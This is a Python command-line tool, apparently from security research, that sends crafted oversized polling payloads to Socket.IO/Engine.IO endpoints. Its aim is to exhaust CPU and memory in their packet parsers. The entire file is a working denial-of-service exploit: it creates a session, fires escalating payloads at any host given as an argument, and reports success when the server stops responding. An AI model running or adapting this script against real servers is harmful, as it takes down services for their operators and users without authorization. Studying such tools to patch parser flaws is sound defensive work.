import argparse
import re
import sys
import time

import requests


DEFAULT_MAX = 100000000
DEFAULT_PATH = 'socket.io/'
DEFAULT_TIMEOUT = 300


def repeat_packet(packet, total_length):
    repetitions = total_length // len(packet)
    return packet * repetitions


def standard_payload(total_length):
    # 4 means MESSAGE in engineio (data[0])
    # 2 means EVENT (non-binary) in socketio (data[1])
    # data_length : data
    return repeat_packet(
        '40:42["my event",{"data":"I\'m connected!"}]',
        total_length,
    )


def giant_packet(total_length):
    # 4 means MESSAGE in engineio (data[0])
    # Then we follow with a massive integer
    # to cause iteration in socketio.Packet.decode / socket.io-parser.decodeString
    prefix = '4'
    data_length = total_length - 2
    while data_length + 1 + len(str(data_length)) > total_length:
        data_length -= 1
    packet = '%d:%s' % (data_length, prefix + '2' * (data_length - len(prefix)))
    return packet


def giant_binary_packet(total_length):
    # 4 means MESSAGE in engineio
    # 5 means BINARY_MESSAGE in socketio
    # Then we follow with a massive integer
    # to cause iteration in socketio.Packet.decode / socket.io-parser.decodeString
    prefix = '45'
    data_length = total_length - 2
    while data_length + 1 + len(str(data_length)) > total_length:
        data_length -= 1
    packet = '%d:%s' % (data_length, prefix + '2' * (data_length - len(prefix)))
    return packet


def many_tiny_packets(total_length, bad_utf8=False):
    # 4 means MESSAGE in engineio (data[0])
    # 2 means EVENT (non-binary) in socketio (data[1])
    # But previously putting a character >0x80 in data
    # slowed down encoded_payload.decode('utf-8', errors='ignore') even more
    # The bad_utf8 issue has now been fixed in python-engineio master
    return repeat_packet(
        '2:4\xbc' if bad_utf8 else '2:42',
        total_length,
    )


def many_heartbeats(total_length):
    return repeat_packet(
        '1:2',
        total_length,
    )


def timestr():
    return "&t=" + str(time.time())


def get_new_session_url(host, path, timeout=DEFAULT_TIMEOUT, headers=None):
    base_url = f"{host}/{path}?EIO=3&transport=polling"
    # Create session
    response = requests.get(
        base_url + timestr(),
        headers=headers,
        timeout=timeout,
    ).text
    print("Response from server", repr(response))
    sid = re.search("\"sid\":\"([^\"]+)\"", response).group(1)
    print("Got session", sid)
    return base_url + "&sid=" + sid


def attack(host, payload_length=DEFAULT_MAX, make_payload=many_tiny_packets, path=DEFAULT_PATH, timeout=DEFAULT_TIMEOUT, headers=None):
    session_url = get_new_session_url(host, path, timeout, headers)
    # Fire payload
    payload = make_payload(payload_length)
    print("Firing payload of length", len(payload), repr(payload[:100]))
    try:
        start_time = time.time()
        final_response = requests.post(
            session_url + timestr(),
            data=payload,
            timeout=timeout,
            headers={'Content-Type': 'text/plain', **(headers or {})},
        ).text
        print("Server returned", repr(final_response))
    except requests.exceptions.ConnectionError as e:
        print(e)
    finally:
        print("Duration:", int(time.time() - start_time))


def send_one_heartbeat(host, sid, path=DEFAULT_PATH):
    session_url = f"{host}/{path}?EIO=3&transport=polling&sid={sid}"
    final_response = requests.post(
        session_url + timestr(),
        data='1:2',
        headers={'Content-Type': 'text/plain'},
    ).text
    print("Server returned", repr(final_response))


def get_responses(host, sid, path=DEFAULT_PATH):
    session_url = f"{host}/{path}?EIO=3&transport=polling&sid={sid}"
    final_response = requests.get(
        session_url + timestr(),
    ).text
    print("Server returned", repr(final_response))


def x(payload_length=DEFAULT_MAX, make_payload=many_tiny_packets, path=DEFAULT_PATH):
    return attack("http://127.0.0.1:5000", payload_length, make_payload, path)


def oom_nodejs(
    host='http://127.0.0.1:5000',
    payload_length=DEFAULT_MAX,
    make_payload=many_tiny_packets,
    path=DEFAULT_PATH,
    timeout=DEFAULT_TIMEOUT,
    headers=None,
):
    """Try to find a DoS payload which isn't so large that we hit the ping timeout before OOM."""
    try:
        while payload_length > 50000:  # No point continuing shorter than this
            attack(host, payload_length, make_payload, path, timeout, headers)
            payload_length = int(payload_length * 0.7)  # Try slightly smaller payload avoiding ping timed out
        get_new_session_url(host, path, timeout, headers)
    except requests.exceptions.ConnectionError:
        print("Server no longer responds :)")
    else:
        print("Server survived :(")


def oom_nodejs_all(host='http://127.0.0.1:5000', payload_length=DEFAULT_MAX, path=DEFAULT_PATH, timeout=DEFAULT_TIMEOUT, headers=None):
    for make_payload in (many_tiny_packets, many_heartbeats, giant_packet):
        print("Trying payload type:", make_payload.__name__)
        oom_nodejs(host, payload_length, make_payload, path, timeout, headers)


def main():
    parser = argparse.ArgumentParser(description='Kill socket / engine io', epilog="By Ben Caller. Use responsibly.", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("host", help="Starting with protocol and ending without a forward slash e.g. https://a.b.c:123")
    parser.add_argument("--path", default=DEFAULT_PATH, help="Location of socket.io endpoint starting without a forward slash")
    parser.add_argument("-l", "--max-length", default=DEFAULT_MAX, help="Maximum payload length to send", type=int)
    parser.add_argument("-t", "--timeout", default=DEFAULT_TIMEOUT, help="Time out the request after this many seconds", type=int)
    parser.add_argument("-H", "--header", nargs=2, action='append', help="Headers to add to all requests. --header NAME VALUE --header NAME2 VALUE2")
    args = parser.parse_args()
    headers = None
    if args.header:
        headers = {}
        for k, v in args.header:
            headers[k] = v
    oom_nodejs_all(args.host, args.max_length, args.path, args.timeout, headers)

if __name__ == '__main__':
    if len(sys.argv) > 1:
        main()
